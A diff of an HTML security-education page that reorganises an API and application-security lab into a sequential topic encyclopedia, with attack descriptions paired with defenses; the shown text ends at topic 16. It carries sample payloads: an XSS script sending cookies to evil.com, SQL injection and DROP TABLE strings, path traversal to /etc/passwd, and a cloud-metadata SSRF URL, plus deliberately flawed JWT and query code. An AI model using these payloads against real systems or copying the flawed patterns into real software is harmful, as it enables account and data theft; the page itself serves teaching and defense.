@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🛡️ Complete API & Application Security Zero-to-Hero Lab</title>
+    <title>🛡️ The Complete 48-Topic Sequential API & AppSec Encyclopedia</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -11,23 +11,23 @@
             --bg1: #090912;
             --bg2: #121222;
             --bg3: rgba(22, 22, 38, 0.94);
-            --glass: rgba(255, 255, 255, 0.03);
             --brd: rgba(255, 255, 255, 0.08);
             --brd2: rgba(255, 255, 255, 0.18);
             --t1: #f4f4fa;
             --t2: #a8a8ca;
             --t3: #68688a;
-            --vi: #7c5cfc;
-            --vi2: rgba(124, 92, 252, 0.18);
-            --cy: #00e5ff;
-            --cy2: rgba(0, 229, 255, 0.14);
-            --em: #10b981;
-            --em2: rgba(16, 185, 129, 0.14);
             --am: #f59e0b;
-            --am2: rgba(245, 158, 11, 0.14);
+            --am2: rgba(245, 158, 11, 0.18);
             --ro: #f43f5e;
             --ro2: rgba(244, 63, 94, 0.18);
-            --r: 14px;
+            --vi: #7c5cfc;
+            --vi2: rgba(124, 92, 252, 0.18);
+            --bl: #38bdf8;
+            --bl2: rgba(56, 189, 248, 0.18);
+            --cy: #00e5ff;
+            --cy2: rgba(0, 229, 255, 0.18);
+            --em: #10b981;
+            --em2: rgba(16, 185, 129, 0.18);
             --r2: 20px;
         }
 
@@ -37,7 +37,7 @@
             font-family: 'Inter', system-ui, sans-serif;
             background: var(--bg0);
             color: var(--t1);
-            line-height: 1.8;
+            line-height: 1.7;
             overflow-x: hidden;
         }
 
@@ -54,14 +54,13 @@
         code {
             font-family: 'JetBrains Mono', monospace;
             background: rgba(124, 92, 252, 0.15);
-            color: var(--cy);
+            color: #00e5ff;
             padding: 2px 7px;
             border-radius: 5px;
             font-size: 0.88em;
             font-weight: 600;
         }
 
-        /* Navbar */
         header {
             position: sticky;
             top: 0;
@@ -71,54 +70,14 @@
             border-bottom: 1px solid var(--brd);
             padding: 14px 30px;
         }
-        .h-inner {
-            max-width: 1400px;
-            margin: 0 auto;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            gap: 20px;
-        }
-        .h-logo {
-            font-weight: 900;
-            font-size: 1.25rem;
-            background: linear-gradient(135deg, var(--ro), var(--am));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
+        .h-inner { max-width: 1400px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; gap: 20px; }
+        .h-logo { font-weight: 900; font-size: 1.25rem; background: linear-gradient(135deg, var(--ro), var(--am)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .h-nav { display: flex; gap: 12px; }
-        .h-btn {
-            padding: 8px 18px;
-            border: 1px solid var(--brd);
-            background: var(--bg2);
-            color: var(--t1);
-            text-decoration: none;
-            font-weight: 700;
-            font-size: 0.85rem;
-            border-radius: 10px;
-            transition: all 0.25s;
-            cursor: pointer;
-        }
-        .h-btn:hover {
-            background: var(--ro);
-            border-color: var(--ro);
-            color: #fff;
-            box-shadow: 0 0 20px rgba(244, 63, 94, 0.4);
-        }
+        .h-btn { padding: 8px 18px; border: 1px solid var(--brd); background: var(--bg2); color: var(--t1); text-decoration: none; font-weight: 700; font-size: 0.85rem; border-radius: 10px; transition: all 0.25s; }
+        .h-btn:hover { background: var(--ro); border-color: var(--ro); color: #fff; }
 
-        /* Layout */
-        .container {
-            max-width: 1400px;
-            margin: 30px auto;
-            padding: 0 30px;
-            position: relative;
-            z-index: 1;
-        }
+        .container { max-width: 1400px; margin: 30px auto; padding: 0 30px; position: relative; z-index: 1; }
 
-        /* Hero */
         .hero {
             background: linear-gradient(135deg, rgba(244, 63, 94, 0.12), rgba(245, 158, 11, 0.08));
             border: 1px solid var(--ro2);
@@ -126,142 +85,47 @@
             padding: 40px;
             margin-bottom: 40px;
         }
-        .hero h1 {
-            font-size: clamp(2rem, 4vw, 3.2rem);
-            font-weight: 900;
-            letter-spacing: -0.03em;
-            margin-bottom: 16px;
-            line-height: 1.2;
-        }
-        .hero p {
-            font-size: 1.1rem;
-            color: var(--t2);
-            max-width: 950px;
-            margin-bottom: 24px;
-        }
-        .hero-tags { display: flex; flex-wrap: wrap; gap: 10px; }
-        .tag { padding: 6px 14px; border-radius: 99px; font-size: 0.8rem; font-weight: 800; text-transform: uppercase; }
-        .tag-ro { background: var(--ro2); color: #ff8093; border: 1px solid rgba(244, 63, 94, 0.3); }
-        .tag-am { background: var(--am2); color: var(--am); border: 1px solid rgba(245, 158, 11, 0.3); }
-        .tag-cy { background: var(--cy2); color: var(--cy); border: 1px solid rgba(0, 229, 255, 0.3); }
+        .hero h1 { font-size: clamp(2rem, 4vw, 3.2rem); font-weight: 900; letter-spacing: -0.03em; margin-bottom: 16px; line-height: 1.2; }
+        .hero p { font-size: 1.1rem; color: var(--t2); max-width: 950px; }
 
-        /* Level Navigation */
-        .level-nav {
-            display: flex;
-            gap: 12px;
-            overflow-x: auto;
-            padding-bottom: 15px;
-            margin-bottom: 35px;
-            border-bottom: 1px solid var(--brd);
-        }
-        .l-tab {
-            padding: 14px 24px;
-            background: var(--bg2);
-            border: 1px solid var(--brd);
-            border-radius: 12px;
-            color: var(--t2);
-            font-weight: 800;
-            font-size: 0.9rem;
-            cursor: pointer;
-            white-space: nowrap;
-            transition: all 0.25s;
-        }
-        .l-tab:hover { color: #fff; border-color: var(--brd2); }
-        .l-tab.on {
-            background: var(--ro);
-            color: #fff;
-            border-color: var(--ro);
-            box-shadow: 0 0 25px rgba(244, 63, 94, 0.45);
-        }
+        /* Sequential Step Tabs */
+        .step-nav { display: flex; gap: 12px; overflow-x: auto; padding-bottom: 15px; margin-bottom: 35px; border-bottom: 1px solid var(--brd); }
+        .s-tab { padding: 15px 22px; background: var(--bg2); border: 2px solid var(--brd); border-radius: 14px; color: var(--t2); font-weight: 800; font-size: 0.9rem; cursor: pointer; white-space: nowrap; transition: all 0.25s; }
+        .s-tab:hover { color: #fff; border-color: var(--brd2); }
+        .s-tab.on-am { background: #d97706; color: #fff; border-color: var(--am); box-shadow: 0 0 25px rgba(245, 158, 11, 0.45); }
+        .s-tab.on-ro { background: var(--ro); color: #fff; border-color: var(--ro); box-shadow: 0 0 25px rgba(244, 63, 94, 0.45); }
+        .s-tab.on-vi { background: var(--vi); color: #fff; border-color: var(--vi); box-shadow: 0 0 25px rgba(124, 92, 252, 0.45); }
+        .s-tab.on-bl { background: #0284c7; color: #fff; border-color: var(--bl); box-shadow: 0 0 25px rgba(56, 189, 248, 0.45); }
+        .s-tab.on-cy { background: #0891b2; color: #fff; border-color: var(--cy); box-shadow: 0 0 25px rgba(0, 229, 255, 0.45); }
+        .s-tab.on-em { background: #059669; color: #fff; border-color: var(--em); box-shadow: 0 0 25px rgba(16, 185, 129, 0.45); }
 
-        .level-content { display: none; animation: fadeIn 0.35s ease; }
-        .level-content.on { display: block; }
+        .step-content { display: none; animation: fadeIn 0.35s ease; }
+        .step-content.on { display: block; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* Card */
-        .card {
-            background: var(--bg3);
-            border: 1px solid var(--brd);
-            border-radius: var(--r2);
-            padding: 36px;
-            margin-bottom: 35px;
-        }
-        .card h2 { font-size: 1.8rem; font-weight: 900; margin-bottom: 16px; color: #fff; }
-        .card h3 { font-size: 1.3rem; font-weight: 800; margin: 24px 0 12px; color: var(--cy); }
-        .card p { color: var(--t2); margin-bottom: 16px; }
+        .grid-cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(380px, 1fr)); gap: 24px; margin-bottom: 40px; }
+        .topic-card { background: var(--bg3); border: 1px solid var(--brd); border-radius: 16px; padding: 28px; transition: 0.25s; }
+        .topic-card:hover { border-color: var(--brd2); transform: translateY(-3px); }
+        .topic-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; }
+        .topic-title { font-size: 1.2rem; font-weight: 900; color: #fff; display: flex; align-items: center; gap: 10px; }
+        .topic-badge { padding: 4px 10px; border-radius: 6px; font-size: 0.75rem; font-weight: 800; text-transform: uppercase; }
 
-        /* Code Diff Comparison */
-        .code-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; margin: 20px 0; }
-        .code-box { background: #07070f; border-radius: 12px; padding: 20px; border: 1px solid var(--brd); font-family: 'JetBrains Mono', monospace; font-size: 0.88rem; white-space: pre-wrap; }
-        .code-wrong { border-color: rgba(244, 63, 94, 0.5); }
-        .code-right { border-color: rgba(16, 185, 129, 0.5); }
-        .code-title { font-weight: 800; margin-bottom: 10px; display: flex; align-items: center; gap: 8px; }
+        .badge-am { background: var(--am2); color: #fcd34d; border: 1px solid var(--am); }
+        .badge-ro { background: var(--ro2); color: #ff8093; border: 1px solid var(--ro); }
+        .badge-vi { background: var(--vi2); color: #c084fc; border: 1px solid var(--vi); }
+        .badge-bl { background: var(--bl2); color: #7dd3fc; border: 1px solid var(--bl); }
+        .badge-cy { background: var(--cy2); color: #67e8f9; border: 1px solid var(--cy); }
+        .badge-em { background: var(--em2); color: #6ee7b7; border: 1px solid var(--em); }
 
-        /* Sandbox Boxes */
-        .sandbox {
-            background: #05050a;
-            border: 2px solid var(--ro);
-            border-radius: 16px;
-            padding: 28px;
-            margin: 25px 0;
-            box-shadow: 0 15px 40px rgba(0,0,0,0.7);
-        }
-        .sandbox h3 { color: #ff8093; margin-top: 0; }
-        
-        .grid-2 { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin: 20px 0; }
-        .box-col { background: var(--bg2); padding: 20px; border-radius: 12px; border: 1px solid var(--brd); }
-        .box-col label { font-weight: 700; color: var(--t1); display: block; margin-bottom: 6px; font-size: 0.9rem; }
-        .box-col textarea, .box-col input {
-            width: 100%;
-            background: #080811;
-            border: 1px solid var(--brd2);
-            border-radius: 8px;
-            color: #fff;
-            padding: 12px;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.9rem;
-            margin-bottom: 14px;
-            outline: none;
-        }
-
-        .jwt-token-display {
-            background: #0d0d1a;
-            border: 1px solid var(--brd2);
-            border-radius: 10px;
-            padding: 16px;
-            font-family: 'JetBrains Mono', monospace;
-            word-break: break-all;
-            font-size: 0.95rem;
-        }
-        .jwt-header { color: #fb7185; }
-        .jwt-payload { color: #c084fc; }
-        .jwt-signature { color: #38bdf8; }
-
-        .form-row { display: flex; gap: 10px; margin: 15px 0; flex-wrap: wrap; }
-        .btn {
-            background: var(--ro);
-            color: #fff;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 8px;
-            font-weight: 800;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-        .btn:hover { transform: scale(1.02); box-shadow: 0 0 15px rgba(244,63,94,0.5); }
-        .out-box { background: #000; padding: 15px; border-radius: 8px; font-family: 'JetBrains Mono', monospace; color: var(--am); margin-top: 15px; white-space: pre-wrap; }
-
-        table { width: 100%; border-collapse: collapse; margin: 25px 0; background: var(--bg2); border-radius: 12px; overflow: hidden; }
-        th, td { padding: 16px 20px; text-align: left; border-bottom: 1px solid var(--brd); }
-        th { background: rgba(244, 63, 94, 0.2); color: #fff; font-weight: 800; }
-        tr:hover { background: rgba(255, 255, 255, 0.02); }
+        .topic-desc { color: var(--t2); font-size: 0.95rem; margin-bottom: 16px; }
+        .topic-fix { background: #07070f; border-left: 3px solid var(--em); padding: 12px 16px; border-radius: 0 8px 8px 0; font-size: 0.88rem; color: #d1d5db; font-family: 'JetBrains Mono', monospace; }
     </style>
 </head>
 <body>
 
     <header>
         <div class="h-inner">
-            <div class="h-logo">🛡️ API & AppSec Zero-to-Hero Lab</div>
+            <div class="h-logo">🛡️ API & AppSec Sequential Encyclopedia (48 Topics)</div>
             <div class="h-nav">
                 <a href="index.html" class="h-btn">← Handbook Dashboard</a>
                 <a href="linux_zero_to_hero.html" class="h-btn">🐧 Linux Lab</a>
@@ -271,354 +135,358 @@
 
     <div class="container">
         <div class="hero">
-            <h1>API Security & Application Protection Encyclopedia</h1>
-            <p>Every API endpoint is a door into your system. Master how attackers map endpoints, exploit broken authorization (IDOR / BOLA), inject code (SQLi, XSS), manipulate JWT tokens, bypass rate limiters, and how enterprise engineers architect defense-in-depth.</p>
-            <div class="hero-tags">
-                <span class="tag tag-ro">🚪 API Endpoints & Recon</span>
-                <span class="tag tag-am">💉 IDOR, SQLi & Mass Assignment</span>
-                <span class="tag tag-cy">🔐 JWT Manipulation & Rate Limits</span>
-            </div>
+            <h1>The Complete Sequential API Security Masterclass</h1>
+            <p>Structured in the exact chronological order of how real-world applications are mapped by attackers, attacked, secured with authentication, armored across network layers, designed resiliently, and audited with defensive operations.</p>
         </div>
 
-        <div class="level-nav">
-            <div class="l-tab on" onclick="switchLevel(0)">🚪 1. Endpoints & Attacker Recon</div>
-            <div class="l-tab" onclick="switchLevel(1)">🔑 2. JWT Manipulation & Auth</div>
-            <div class="l-tab" onclick="switchLevel(2)">🛑 3. IDOR & Access Control</div>
-            <div class="l-tab" onclick="switchLevel(3)">💉 4. SQLi & Mass Assignment</div>
-            <div class="l-tab" onclick="switchLevel(4)">⚡ 5. XSS, CSRF & CORS</div>
-            <div class="l-tab" onclick="switchLevel(5)">⏱️ 6. Rate Limiting & SSRF</div>
+        <div class="step-nav">
+            <div class="s-tab on-am" onclick="switchStep(0, 'am')">🕵️ Step 1: Recon & Exposure (8 Topics)</div>
+            <div class="s-tab" onclick="switchStep(1, 'ro')">💥 Step 2: Attack Types (12 Topics)</div>
+            <div class="s-tab" onclick="switchStep(2, 'vi')">🔐 Step 3: Auth & Identity (8 Topics)</div>
+            <div class="s-tab" onclick="switchStep(3, 'bl')">🌐 Step 4: Transport & Network (4 Topics)</div>
+            <div class="s-tab" onclick="switchStep(4, 'cy')">🛠️ Step 5: API Design Security (8 Topics)</div>
+            <div class="s-tab" onclick="switchStep(5, 'em')">🛡️ Step 6: Defensive Tools & Shield (8 Topics)</div>
         </div>
 
-        <!-- LEVEL 0: ENDPOINTS & RECON -->
-        <div class="level-content on" id="lvl-0">
-            <div class="card">
-                <h2>Level 1: What is an API Endpoint? & Attacker Reconnaissance</h2>
-                <p>An endpoint is a specific URL your backend exposes to perform an action. Every endpoint is a digital door into your server:</p>
-                <ul>
-                    <li><code>GET /api/users/123</code> → Fetch profile data for user 123</li>
-                    <li><code>POST /api/orders</code> → Create a new order</li>
-                    <li><code>DELETE /api/posts/45</code> → Remove post 45</li>
-                </ul>
-
-                <h3>🕵️ How Attackers Discover Your Exposed Endpoints</h3>
-                <p>Before launching exploits, penetration testers and hackers map out every door in your API using 4 primary reconnaissance methods:</p>
-                
-                <table>
-                    <thead>
-                        <tr>
-                            <th>Reconnaissance Method</th>
-                            <th>How Attackers Execute It</th>
-                            <th>Enterprise Prevention Rules</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <tr>
-                            <td><b>1. Exposed Swagger / OpenAPI Docs</b></td>
-                            <td>Checking default paths like <code>/api-docs</code>, <code>/swagger</code>, or <code>/openapi.json</code>. If left unprotected in production, attackers get your full API blueprint for free!</td>
-                            <td>Always require authentication on documentation routes or disable Swagger UI entirely in production environments.</td>
-                        </tr>
-                        <tr>
-                            <td><b>2. Frontend JavaScript Source Maps</b></td>
-                            <td>Downloading your frontend React/Vue bundle (`bundle.js`) and searching for <code>"/api/"</code> strings to extract every internal route your frontend calls.</td>
-                            <td>Never assume an endpoint is "hidden" just because there is no UI button for it. Every backend endpoint must enforce strict server-side authorization!</td>
-                        </tr>
-                        <tr>
-                            <td><b>3. Path Brute-Forcing</b></td>
-                            <td>Using automated tools like <b>gobuster</b> or <b>ffuf</b> with wordlists containing thousands of paths (e.g., <code>/api/admin</code>, <code>/api/debug</code>, <code>/api/v1/internal</code>).</td>
-                            <td>Implement strict rate limiting and remove all temporary/debug endpoints before merging code to production.</td>
-                        </tr>
-                        <tr>
-                            <td><b>4. Google Dorking</b></td>
-                            <td>Searching Google search engine indexes using operators like <code>site:yourcompany.com inurl:/api/</code> or <code>intitle:"index of /api"</code>.</td>
-                            <td>Ensure proper `robots.txt` configuration and never expose sensitive directory listings.</td>
-                        </tr>
-                    </tbody>
-                </table>
-            </div>
-        </div>
-
-        <!-- LEVEL 1: JWT MANIPULATION -->
-        <div class="level-content" id="lvl-1">
-            <div class="card">
-                <h2>Level 2: JWT Manipulation & Authentication Vulnerabilities</h2>
-                <p>A JSON Web Token (JWT) consists of three Base64Url-encoded parts separated by dots: <code>header.payload.signature</code>. Because payloads are merely Base64 encoded (NOT encrypted), anyone can read them!</p>
-
-                <h3>🚨 The Two Deadliest JWT Attacks</h3>
-                <div class="code-grid">
-                    <div class="code-box code-wrong">
-                        <div class="code-title"><span style="color:#ff5f56;">❌ Attack 1: Role Escalation & jwt.decode() Trap</span></div>
-                        <!-- WRONG: Using jwt.decode() which never verifies the signature -->
-const token = req.headers.authorization?.split(' ')[1];
-
-// DANGER: jwt.decode() simply unpacks base64 without checking cryptographic signature!
-const user = jwt.decode(token);
-if (user.role === 'admin') {
-  // Attacker modified Base64 payload to "role": "admin" and gets full access!
-}
-                    </div>
-                    <div class="code-box code-right">
-                        <div class="code-title"><span style="color:#10b981;">✅ Defense: Always Enforce jwt.verify()</span></div>
-                        <!-- RIGHT: Always verify with secret key -->
-const jwt = require('jsonwebtoken');
-
-function verifyToken(req, res, next) {
-  const token = req.headers.authorization?.split(' ')[1];
-  try {
-    // Cryptographic signature check! Throws error if payload was tampered or expired!
-    const decoded = jwt.verify(token, process.env.JWT_SECRET);
-    req.user = decoded;
-    next();
-  } catch (err) {
-    return res.status(401).json({ error: 'Invalid token signature' });
-  }
-}
-                    </div>
+        <!-- STEP 1: RECON & EXPOSURE -->
+        <div class="step-content on" id="s-0">
+            <h2 style="color:var(--am);font-size:1.8rem;font-weight:900;margin-bottom:20px;">🕵️ Step 1: Recon & Exposure — How Attackers Discover Your Surface</h2>
+            
+            <div class="grid-cards">
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">1. Endpoint Enumeration</div><span class="topic-badge badge-am">Discovery</span></div>
+                    <p class="topic-desc">Using wordlists with tools like <b>gobuster</b> or scraping frontend bundle source maps (<code>bundle.js</code>) for <code>/api/</code> strings to find hidden routes.</p>
+                    <div class="topic-fix">Defense: Never rely on security by obscurity. Assume all unlisted endpoints will be found.</div>
                 </div>
 
-                <div class="sandbox">
-                    <h3>⚡ Live Interactive JWT Tampering Sandbox</h3>
-                    <p>Modify the user role from <code>developer</code> to <code>admin</code> in the payload below. Watch the signature recalculate!</p>
-                    <div class="grid-2">
-                        <div class="box-col">
-                            <label>🔴 Header</label>
-                            <textarea id="jwtHeader" rows="2" oninput="encodeJWT()">{ "alg": "HS256", "typ": "JWT" }</textarea>
-                            <label>🟣 Payload</label>
-                            <textarea id="jwtPayload" rows="5" oninput="encodeJWT()">{
-  "userId": 1024,
-  "username": "bhoomim",
-  "role": "developer"
-}</textarea>
-                            <label>🔵 HMAC Secret Key</label>
-                            <input type="text" id="jwtSecret" value="production_secret_key_881" oninput="encodeJWT()">
-                        </div>
-                        <div class="box-col">
-                            <label>Generated Base64Url Token</label>
-                            <div class="jwt-token-display">
-                                <span id="outHeader" class="jwt-header"></span>.<span id="outPayload" class="jwt-payload"></span>.<span id="outSig" class="jwt-signature"></span>
-                            </div>
-                            <p style="font-size:0.85rem;color:var(--am);margin-top:15px;">Notice: If an attacker edits the payload without knowing your secret key, the signature on their token will not match what your backend calculates, blocking the attack!</p>
-                        </div>
-                    </div>
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">2. Exposed API Docs</div><span class="topic-badge badge-am">Blueprint Leak</span></div>
+                    <p class="topic-desc">Leaving Swagger UI or OpenAPI specs (<code>/api-docs</code>, <code>/swagger.json</code>) publicly accessible in production environments.</p>
+                    <div class="topic-fix">Defense: Require authentication on documentation endpoints or remove them in production builds.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">3. Information Disclosure</div><span class="topic-badge badge-am">Stack Traces</span></div>
+                    <p class="topic-desc">Returning raw database SQL errors, environment variables, or server directory file paths in HTTP 500 error responses.</p>
+                    <div class="topic-fix">Defense: Catch internal exceptions and return generic sanitized error messages to clients.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">4. Google Dorking / OSINT</div><span class="topic-badge badge-am">Search Index</span></div>
+                    <p class="topic-desc">Attackers querying Google indexes using search operators like <code>site:company.com inurl:/api/</code> or <code>intitle:"index of /secrets"</code>.</p>
+                    <div class="topic-fix">Defense: Configure strict <code>robots.txt</code> and never expose directory index listings.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">5. Secrets in Git</div><span class="topic-badge badge-am">Repo Leaks</span></div>
+                    <p class="topic-desc">Accidentally committing raw AWS IAM keys, Stripe tokens, or private RSA keys into Git history. Scanned by tools like <b>truffleHog</b>.</p>
+                    <div class="topic-fix">Defense: Enforce `.gitignore` pre-commit hooks (git-secrets) and rotate leaked credentials instantly.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">6. Subdomain Takeover</div><span class="topic-badge badge-am">Dangling DNS</span></div>
+                    <p class="topic-desc">DNS CNAME records pointing to deleted cloud services (e.g., old Heroku apps or S3 buckets). Attackers claim the service and hijack traffic.</p>
+                    <div class="topic-fix">Defense: Periodically audit DNS zone records and remove stale CNAME entries immediately upon service deletion.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">7. Supply Chain Attacks</div><span class="topic-badge badge-am">Dependencies</span></div>
+                    <p class="topic-desc">Typosquatting or compromising upstream package managers (<code>npm</code>, <code>PyPI</code>) to inject malicious pre-install scripts into your node_modules.</p>
+                    <div class="topic-fix">Defense: Lock package hashes using `package-lock.json` and run automated dependency vulnerability audits (`npm audit`).</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">8. Cloud Misconfiguration</div><span class="topic-badge badge-am">Storage Leaks</span></div>
+                    <p class="topic-desc">Leaving AWS S3 buckets, Google Cloud Storage, or MongoDB databases publicly readable without authentication policies.</p>
+                    <div class="topic-fix">Defense: Enforce cloud organization policies blocking public bucket access (AWS Block Public Access).</div>
                 </div>
             </div>
         </div>
 
-        <!-- LEVEL 2: IDOR & ACCESS CONTROL -->
-        <div class="level-content" id="lvl-2">
-            <div class="card">
-                <h2>Level 3: Authorization Giants — IDOR & Broken Access Control</h2>
-                <p>Once authenticated, the server must enforce **Authorization**. The #1 most common API bug in modern web development is **IDOR (Insecure Direct Object Reference)**.</p>
-
-                <h3>1. IDOR (Insecure Direct Object Reference / BOLA)</h3>
-                <p>Imagine a user logs in and requests their order: <code>GET /api/orders/1001</code> ✅. What happens if they change the URL number to <code>GET /api/orders/1002</code>? If the server returns someone else's order, you have an IDOR vulnerability! <i>(Real Example: In 2019, Instagram suffered an IDOR where users could download anyone's private Stories simply by altering a URL ID!)</i></p>
-
-                <div class="code-grid">
-                    <div class="code-box code-wrong">
-                        <div class="code-title"><span style="color:#ff5f56;">❌ WRONG: Fetches whatever ID is passed</span></div>
-// Server trusts the URL parameter blindly!
-const order = await db.query(
-  'SELECT * FROM orders WHERE id = ?',
-  [req.params.id]
-);
-                    </div>
-                    <div class="code-box code-right">
-                        <div class="code-title"><span style="color:#10b981;">✅ RIGHT: Always scope query to verified user</span></div>
-// Always enforce ownership matching verified JWT session!
-const order = await db.query(
-  'SELECT * FROM orders WHERE id = ? AND user_id = ?',
-  [req.params.id, req.user.id] // req.user comes from verified token!
-);
-                    </div>
+        <!-- STEP 2: ATTACK TYPES -->
+        <div class="step-content" id="s-1">
+            <h2 style="color:var(--ro);font-size:1.8rem;font-weight:900;margin-bottom:20px;">💥 Step 2: Attack Types — The 12 Exploits That Break Your API</h2>
+            
+            <div class="grid-cards">
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">9. IDOR / BOLA</div><span class="topic-badge badge-ro">Critical #1</span></div>
+                    <p class="topic-desc">Changing URL identifiers (<code>/api/orders/1001</code> ➔ <code>1002</code>) to view objects belonging to other users without authorization checks.</p>
+                    <div class="topic-fix">Defense: Always scope SQL query to verified JWT user ID: <code>WHERE id=? AND user_id=req.user.id</code></div>
                 </div>
 
-                <h3>2. Broken Function Level Access Control (BFLA)</h3>
-                <p>When regular users can invoke administrative endpoints like <code>DELETE /api/admin/users/55</code> because the backend forgot to check user roles.</p>
-                <div class="code-box code-right">
-                    <div class="code-title"><span style="color:#10b981;">✅ Defense: Role-Checking Middleware</span></div>
-function requireAdmin(req, res, next) {
-  if (req.user.role !== 'admin') {
-    return res.status(403).json({ error: 'Forbidden: Admin access required' });
-  }
-  next();
-}
-
-// Apply middleware strictly to administrative routes
-app.delete('/api/admin/users/:id', verifyToken, requireAdmin, deleteUser);
-                </div>
-            </div>
-        </div>
-
-        <!-- LEVEL 3: SQL INJECTION & MASS ASSIGNMENT -->
-        <div class="level-content" id="lvl-3">
-            <div class="card">
-                <h2>Level 4: SQL Injection & Mass Assignment</h2>
-                
-                <h3>1. SQL Injection (SQLi) Simulator</h3>
-                <p>When user input is concatenated into raw SQL queries (`' OR '1'='1`), attackers can log in as admins or execute destructive commands like <code>'; DROP TABLE users; --</code>.</p>
-                
-                <div class="sandbox">
-                    <h3>⚡ Interactive SQL Injection Login Bypass</h3>
-                    <p>Enter username <code>admin</code> or try classic SQLi bypass: <code>' OR '1'='1</code></p>
-                    <div class="form-row">
-                        <input type="text" id="sqliUser" placeholder="Enter username (try: ' OR '1'='1 )" style="background:#0b0b16;border:1px solid var(--brd2);color:#fff;padding:12px;border-radius:8px;flex:1;font-family:'JetBrains Mono',monospace;">
-                        <button class="btn" onclick="runSQLi(false)">Execute Vulnerable Query</button>
-                        <button class="btn" style="background:var(--em);" onclick="runSQLi(true)">Execute Parameterized Defense ($1)</button>
-                    </div>
-                    <div class="out-box" id="sqliOutput">Run a query above to inspect database execution!</div>
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">10. SQL Injection (SQLi)</div><span class="topic-badge badge-ro">Injection</span></div>
+                    <p class="topic-desc">Concatenating untrusted input into database query strings (<code>' OR '1'='1</code>), allowing attackers to dump or drop tables.</p>
+                    <div class="topic-fix">Defense: Strictly use Parameterized Queries (<code>$1</code> / Prepared Statements).</div>
                 </div>
 
-                <h3>2. Mass Assignment (Over-Posting)</h3>
-                <p>When a developer passes <code>req.body</code> directly into an ORM or database update function without whitelisting fields, attackers can inject arbitrary attributes!</p>
-                <div class="code-grid">
-                    <div class="code-box code-wrong">
-                        <div class="code-title"><span style="color:#ff5f56;">❌ WRONG: Spreading req.body directly</span></div>
-// Attacker sends { "name": "Bhoomi", "role": "admin", "balance": 999999 }
-await db.users.update(req.params.id, req.body);
-// Attacker just granted themselves admin privileges!
-                    </div>
-                    <div class="code-box code-right">
-                        <div class="code-title"><span style="color:#10b981;">✅ RIGHT: Explicit Field Whitelisting (DTO)</span></div>
-// Destructure and whitelist only allowed fields!
-const { name, email } = req.body;
-await db.users.update(req.params.id, { name, email });
-                    </div>
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">11. XSS (Cross-Site Scripting)</div><span class="topic-badge badge-ro">Browser</span></div>
+                    <p class="topic-desc">Injecting JavaScript tags (<code>&lt;script&gt;fetch('evil.com?c='+document.cookie)&lt;/script&gt;</code>) into HTML DOM to steal session tokens.</p>
+                    <div class="topic-fix">Defense: Context-aware HTML entity escaping + Content Security Policy (CSP).</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">12. CSRF (Request Forgery)</div><span class="topic-badge badge-ro">Browser</span></div>
+                    <p class="topic-desc">Malicious third-party website auto-attaches victim's authenticated cookies to forge state mutations on banking/API servers.</p>
+                    <div class="topic-fix">Defense: Set cookies to <code>SameSite=Strict/Lax</code> + Anti-CSRF Synchronizer Tokens.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">13. Mass Assignment</div><span class="topic-badge badge-ro">Over-Posting</span></div>
+                    <p class="topic-desc">Passing <code>req.body</code> directly to database update ORMs allows attackers to inject extra attributes like <code>{"role": "admin"}</code>.</p>
+                    <div class="topic-fix">Defense: Explicitly whitelist allowed fields via DTOs (<code>const {name} = req.body</code>).</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">14. Path Traversal</div><span class="topic-badge badge-ro">Filesystem</span></div>
+                    <p class="topic-desc">Manipulating file download endpoints (<code>../../../../etc/passwd</code>) to read arbitrary operating system files.</p>
+                    <div class="topic-fix">Defense: Strip traversal sequences (<code>../</code>) and validate against absolute base directory paths.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">15. SSRF (Server-Side Forgery)</div><span class="topic-badge badge-ro">Cloud Threat</span></div>
+                    <p class="topic-desc">Supplying webhook URLs targeting internal cloud metadata IP addresses (<code>http://169.254.169.254/latest/meta-data/</code>) to steal cloud IAM roles.</p>
+                    <div class="topic-fix">Defense: Block internal network IP ranges (<code>10.0.0.0/8</code>, <code>127.0.0.1</code>) in URL input validators.</div>
+                </div>
+
+                <div class="topic-card">
+                    <div class="topic-header"><div class="topic-title">16. XXE (XML External Entity)</div><span class="topic-badge badge-ro">XML Parser</span></div>
